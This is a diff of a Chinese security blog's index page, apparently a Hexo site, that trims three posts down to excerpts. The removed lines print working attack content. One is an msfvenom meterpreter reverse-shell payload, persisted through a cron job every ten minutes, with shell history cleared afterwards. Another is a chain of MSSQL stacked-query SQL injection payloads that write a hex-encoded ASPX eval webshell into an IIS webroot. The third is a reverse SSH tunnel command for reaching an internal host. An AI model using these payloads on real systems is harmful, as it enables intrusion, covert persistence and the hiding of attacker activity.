@@ -176,25 +176,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>Linux反弹及定时任务</p>
-<p>&lt; –more– &gt;</p>
-<p>生成linux木马</p>
-<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f  elf &gt; shell.elf</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/1.png" alt="img"></p>
-<p>上传至目标服务器</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/2.png" alt="img"></p>
-<p>测试可用后</p>
-<p>创建文件 door.sh</p>
-<p>将要执行内容写入 door.sh</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/3.png" alt="img"></p>
-<p>写入后 执行 crontab -e 编辑定时任务</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/4.png" alt="img"></p>
-<p>每十分钟连接一次服务器</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/5.png" alt="img"></p>
-<p>成功反弹</p>
-<p>cd~下</p>
-<p>编辑  .bash_history      G到最后一行清除命令历史记录</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/6.png" alt="img"></p>
-
+        
+          <a class="article-more-a" href="/2019/12/13/Linux%E5%8F%8D%E5%BC%B9%E5%8F%8A%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/#more">more >></a>
+        
       
 
       
@@ -261,48 +245,9 @@
 <p>支持堆叠查询</p>
 <p>延时注入 获取数据库很慢</p>
 <p>抓包进行手工注入</p>
-<p>&lt;–more–&gt;</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/1.png" alt="img"></p>
-<p>判断注入点 id=1后面 </p>
-<p>id=1’;WAITFOR DELAY ‘0:0:5’–</p>
-<p>repeater发包需要url编码</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/2.png" alt="img"></p>
-<p>权限判断</p>
-<p>id=1’;if ( select IS_SRVROLEMEMBER(‘sysadmin’))=1 WAITFOR DELAY ‘0:0:5’–</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/3.png" alt="img"></p>
-<p>延时5秒以上 说明是dba权限</p>
-<p>使用差异备份将一句话木马写入数据库</p>
-<p>首先</p>
-<p>id=1’;create database test1 –</p>
-<p>create database test1  #创建一个名为test1的数据库</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/4.png" alt="img"></p>
-<p>再test1数据库里创建一张表</p>
-<p>id=1’;create table test1.dbo.cmd(cmd varchar(1000)) –</p>
-<p>create table test1.dbo.cmd(cmd varchar(1000))   #创表</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/5.png" alt="img"></p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/6.png" alt="img"></p>
-<p>成功创建库和表</p>
-<p>盲注的情况下可以通过完整备份数据库到已知路径下查看是否成功</p>
-<p>本站中间件为IIS 所以尝试使用IIS默认安装路径 C:\inetpub\wwwroot\</p>
-<p>完整备份 </p>
-<p>执行</p>
-<p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’ –</p>
-<p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’   #完整备份</p>
-<p>在建立的表里插入十六进制编码的一句话木马</p>
-<p>id=1’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E) –</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/7.png" alt="img"></p>
-<p>insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E)  #插入一句话</p>
-<p>最后使用差异备份将木马写入数据库内</p>
-<p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/8.png" alt="img"></p>
-<p>查看写入情况</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/9.png" alt="img"></p>
-<p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential  #差异备份</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/10.png" alt="img"></p>
-<p>完成后去连接一句话木马</p>
-<p>‘;create table test1.dbo.cmd(cmd varchar(1000));Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E);Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</p>
-<p>可以一次性执行</p>
-
+        
+          <a class="article-more-a" href="/2019/12/13/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/#more">more >></a>
+        
       
 
       
@@ -365,16 +310,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>A主机 内网主机<br>B主机 公网主机</p>
-<p>&lt;–more–&gt;</p>
-<p>A内网主机执行<br>ssh -p2222(公网主机ssh端口) -qngfNTR 9999(公网主机连接端口)：xxx.xxx.xxx.xxx(内网机IP):22(内网机端口)  xxxx(公网主机用户名)@xx.xxx.xx.xx(公网主机ip)</p>
-<p>ssh -p2222 -qngfNTR 9999:192.168.233.132:22 <a href="mailto:ubuntu@xxx.xxx.xxx.xxx" target="_blank" rel="noopener">ubuntu@xxx.xxx.xxx.xxx</a> 该模式为交互模式需要输入公网主机密码</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/1.png" alt="avatar"></p>
-<p>B公网主机执行<br>ssh -p 9999 <a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>   该模式为交互模式需要输入内网主机密码</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/2.png" alt="avatar"></p>
-<p>成功连接内网主机<br><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/3.png" alt="avatar"></p>
-<p>测试使用ssh-keygen以后是否需要交互<br><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/4.png" alt="avatar"></p>
-<p>使用ssh免密机制以后可以直接反向ssh隧道连接<br><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/5.png" alt="avatar"></p>
-
+        
+          <a class="article-more-a" href="/2019/12/12/Linux%E5%8F%8D%E5%90%91ssh%E9%9A%A7%E9%81%93/#more">more >></a>
+        
       
 
       
